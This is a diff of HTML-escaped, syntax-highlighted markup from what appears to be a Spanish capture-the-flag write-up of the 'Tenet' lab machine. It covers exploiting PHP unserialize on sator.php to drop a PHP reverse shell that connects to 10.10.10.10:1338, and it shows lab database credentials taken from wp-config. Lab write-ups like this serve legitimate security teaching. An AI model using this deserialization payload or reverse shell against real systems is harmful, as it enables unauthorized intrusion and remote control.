@@ -338,7 +338,7 @@ Interesting Finding&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&
 &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; Database updated &amp;lt;br&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;php-unserialize---rce-&#34;&gt;PHP UNSERIALIZE - RCE&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;php-unserialize---rce&#34;&gt;PHP UNSERIALIZE - RCE&lt;/h2&gt;
 &lt;p&gt;Neil habla de un backup pero no especifíca de que archivo/software/db, aunque menciona &lt;code&gt;sator.php&lt;/code&gt;, agregamos la extension de un backup (&lt;code&gt;bak&lt;/code&gt;) al archivo &lt;code&gt;sator.php.bak&lt;/code&gt; y logramos obtener el codigo fuente.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -373,7 +373,7 @@ Interesting Finding&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 
 &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;DatabaseExport&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
@@ -401,8 +401,8 @@ Interesting Finding&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&
 &lt;span class=&#34;nv&#34;&gt;$app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;nv&#34;&gt;$app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;update_db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
 
-&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Al analizar el codigo, observamos una variable que obtiene el valor pasado al parametro &lt;code&gt;arepo&lt;/code&gt; por medio de una solicitud GET, este valor es &lt;em&gt;unserializado&lt;/em&gt; (&lt;code&gt;unzerialize($_GET[&#39;arepo&#39;])&lt;/code&gt;), por ultimo se crea un objeto del tipo &lt;code&gt;DatabaseExport()&lt;/code&gt; y realiza la ejecucion de la funcion &lt;code&gt;update_db()&lt;/code&gt;. Sabiendo lo anterior vamos a enfocarnos en la funcion &lt;code&gt;unserialize()&lt;/code&gt; ya que si se le pasa un valor serializado este puede ser ejecutado como se indica en la documentacion de &lt;a href=&#34;https://www.php.net/manual/es/function.unserialize.php&#34;&gt;php&lt;/a&gt;.&lt;br /&gt;
 &lt;div class=&#34;alert alert-info&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;Advertencia: &amp;hellip; La deserialización puede resultar en que el código sea cargado y ejecutado debido a la instanciación y autocarga de objetos, y un usuario malicioso podría ser capaz de explotar este comportamiento. &amp;hellip;&lt;/div&gt;
@@ -422,7 +422,7 @@ Interesting Finding&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;DatabaseExport&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 	&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;batman.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
@@ -431,8 +431,8 @@ Interesting Finding&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&
 
 &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
 
-&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -476,7 +476,7 @@ knock knock
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
 &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php $sock=fsockopen(&amp;#34;10.10.10.10&amp;#34;,1338);$proc=proc_open(&amp;#34;/bin/sh -i&amp;#34;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock),$pipes);echo &amp;#34;hi&amp;#34; ?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
@@ -540,23 +540,23 @@ www-data@tenet:/var/www/html$
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;/** MySQL database username */                                                 
-define( &amp;#39;DB_USER&amp;#39;, &amp;#39;neil&amp;#39; );
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/** MySQL database username */&lt;/span&gt;                                                 
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;neil&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 
-/** MySQL database password */
-define( &amp;#39;DB_PASSWORD&amp;#39;, &amp;#39;Opera2112&amp;#39; );
+&lt;span class=&#34;sd&#34;&gt;/** MySQL database password */&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Opera2112&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 
-/** MySQL hostname */
-define( &amp;#39;DB_HOST&amp;#39;, &amp;#39;localhost&amp;#39; );
+&lt;span class=&#34;sd&#34;&gt;/** MySQL hostname */&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_HOST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 
-/** Database Charset to use in creating database tables. */
-define( &amp;#39;DB_CHARSET&amp;#39;, &amp;#39;utf8mb4&amp;#39; );
+&lt;span class=&#34;sd&#34;&gt;/** Database Charset to use in creating database tables. */&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_CHARSET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 
-/** The Database Collate type. Don&amp;#39;t change this if in doubt. */
-define( &amp;#39;DB_COLLATE&amp;#39;, &amp;#39;&amp;#39; );
+&lt;span class=&#34;sd&#34;&gt;/** The Database Collate type. Don&amp;#39;t change this if in doubt. */&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_COLLATE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 
-define( &amp;#39;WP_HOME&amp;#39;, &amp;#39;http://tenet.htb&amp;#39;); 
-define( &amp;#39;WP_SITEURL&amp;#39;, &amp;#39;http://tenet.htb&amp;#39;);
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_HOME&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://tenet.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
+&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_SITEURL&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://tenet.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Verificamos que este mismo usuario exista en la maquina y tenga acceso en la maquina.&lt;/p&gt;
